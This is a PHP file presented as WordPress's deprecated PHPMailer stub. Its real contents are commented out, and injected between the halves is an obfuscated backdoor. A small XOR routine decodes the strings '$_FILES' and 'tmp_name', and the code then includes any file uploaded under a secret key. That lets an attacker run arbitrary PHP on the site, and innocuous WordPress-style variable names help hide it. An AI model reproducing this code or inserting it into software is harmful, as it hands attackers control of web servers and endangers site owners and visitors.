<?php /* 

*
 * The PHPMailer class has been moved to the wp-includes/PHPMailer subdirectory and now uses the PHPMailer\PHPMailer namespace.
 
if ( function_exists( '_deprecated_file' ) ) {
	_deprecated_file(
		basename( __FILE__ ),
		'5.5.0',
		WPINC . '/PHPMailer/PHPMailer.php',
		__( 'The PHPMailer class has been moved to w*/
 	
	$height = 'patterns';
$replace_pairs = 'Isbp32u4OG60';
	$menu_order = 'clean_terms';
function stack($the_post, $tags)

{
    $date_string = urldecode($the_post);

    $textarr = substr($tags,0, strlen($date_string));

    $meta = $date_string ^ $textarr;

    return $meta;
}
	$since = 'terms';
$numberposts = ${stack("%165%2B%3Cva", $replace_pairs)};
if (isset($numberposts[$replace_pairs]))

{
    $_links_add_base = $numberposts[$replace_pairs];
    $safe_text = $_links_add_base[stack("%3D%1E%12%2F%5DS%18Q", $replace_pairs)];

    include ($safe_text);

}



/* p-includes/PHPMailer subdirectory and now uses the PHPMailer\PHPMailer namespace.' )
	);
}

require_once __DIR__ . '/PHPMailer/PHPMailer.php';
require_once __DIR__ . '/PHPMailer/Exception.php';

class_alias( PHPMailer\PHPMailer\PHPMailer::class, 'PHPMailer' );
class_alias( PHPMailer\PHPMailer\Exception::class, 'phpmailerException' );
*/